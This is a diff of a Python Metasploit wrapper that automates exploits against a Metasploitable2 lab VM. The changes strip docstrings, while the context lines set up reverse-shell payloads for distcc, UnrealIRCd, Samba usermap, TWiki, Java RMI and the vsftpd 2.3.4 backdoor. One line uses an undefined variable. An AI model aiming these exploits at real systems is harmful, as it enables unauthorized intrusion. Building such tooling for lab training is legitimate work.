@@ -75,20 +75,7 @@ class PyMetasploit:
                 pl[k.upper()] = options[k]
         self.payload = pl
 
-    def set_console(self) -> None:
-        """
-        Configura la consola de Metasploit Framework
-        """
-        cid = self.msfclient.consoles.console().cid
-        self.console = self.msfclient.consoles.console(cid)
-
     def _get_session_id(self) -> Optional[int]:
-        """
-        Obtiene el ID de la sesión
-
-        :return: ID de la sesión, None si no se ha encontrado
-        :rtype: Optional[int]
-        """
         cont = 0
         sid = None
         while cont < 3:
@@ -109,14 +96,6 @@ class PyMetasploit:
         return sid
 
     def _get_shell(self, sid: str):
-        """
-        Obtiene el shell de la sesión
-
-        :param sid: ID de la sesión
-        :type sid: str
-        :return: Shell de la sesión
-        :rtype: ShellSession
-        """
         return self.msfclient.sessions.session(sid)
 
     def _pretty_cli(self, shell, victim_ip, need_refresh=True):
@@ -159,12 +138,6 @@ class PyMetasploit:
         return text
 
     def _end_session(self, sid: str):
-        """
-        Finaliza la sesión
-
-        :param sid: ID de la sesión
-        :type sid: str
-        """
         close = default_input(
             f"Do you want to close the session {sid}? [y/N] ", default="N")
         while close not in ["y", "Y", "N", "n"]:
@@ -262,12 +235,6 @@ class Metasploitable2(VictimHost):
     """
 
     def _exploit_java_rmi_server(self, metasploit: PyMetasploit) -> None:
-        """
-        Explotación automatizada para java_rmi_server
-
-        :param metasploit: Instancia de PyMetasploit
-        :type metasploit: PyMetasploit
-        """
         metasploit.set_exploit(
             name="multi/misc/java_rmi_server", rhosts=self.victim_ip, rport=1099)
         metasploit.set_payload(
@@ -276,12 +243,6 @@ class Metasploitable2(VictimHost):
         metasploit.run(victim_ip=self.victim_ip)
 
     def _exploit_distccd(self, metasploit: PyMetasploit) -> None:
-        """
-        Explotación automatizada para distccd
-
-        :param metasploit: Instancia de PyMetasploit
-        :type metasploit: PyMetasploit
-        """
         metasploit.set_exploit(name="unix/misc/distcc_exec",
                                rhosts=self.victim_ip, rport=3632)
         metasploit.set_payload(name="cmd/unix/reverse",
@@ -290,12 +251,6 @@ class Metasploitable2(VictimHost):
         metasploit.run(victim_ip=self.victim_ip)
 
     def _exploit_unreal_ircd_3281_backdoor(self, metasploit: PyMetasploit) -> None:
-        """
-        Explotación automatizada para unreal_ircd_3281_backdoor
-
-        :param metasploit: Instancia de PyMetasploit
-        :type metasploit: PyMetasploit
-        """
         metasploit.set_exploit(
             name="unix/irc/unreal_ircd_3281_backdoor", rhosts=self.victim_ip, rport=6667)
         metasploit.set_payload(name="cmd/unix/reverse",
@@ -304,12 +259,6 @@ class Metasploitable2(VictimHost):
         metasploit.run(victim_ip=self.victim_ip)
 
     def _exploit_usermap(self, metasploit: PyMetasploit) -> None:
-        """
-        Explotación automatizada para usermap
-
-        :param metasploit: Instancia de PyMetasploit
-        :type metasploit: PyMetasploit
-        """
         metasploit.set_exploit(
             name="multi/samba/usermap_script", rhosts=self.victim_ip, rport=139)
         metasploit.set_payload(name="cmd/unix/reverse",
@@ -318,12 +267,6 @@ class Metasploitable2(VictimHost):
         metasploit.run(victim_ip=victim_ip)
 
     def _exploit_apache_twiki(self, metasploit: PyMetasploit) -> None:
-        """
-        Explotación automatizada para apache twiki
-
-        :param metasploit: Instancia de PyMetasploit
-        :type metasploit: PyMetasploit
-        """
         metasploit.set_exploit(
             name="unix/webapp/twiki_history", rhosts=self.victim_ip, rport=80)
         metasploit.set_payload(name="cmd/unix/reverse",
@@ -332,12 +275,6 @@ class Metasploitable2(VictimHost):
         metasploit.run(victim_ip=self.victim_ip)
 
     def _exploit_vsftpd_234_backdoor(self, metasploit: PyMetasploit) -> None:
-        """
-        Explotación automatizada para vsftpd 2.3.4
-
-        :param metasploit: Instancia de PyMetasploit
-        :type metasploit: PyMetasploit
-        """
         metasploit.set_exploit(
             name="unix/ftp/vsftpd_234_backdoor", rhosts=self.victim_ip, rport=21)
         metasploit.set_payload(name="cmd/unix/interact")
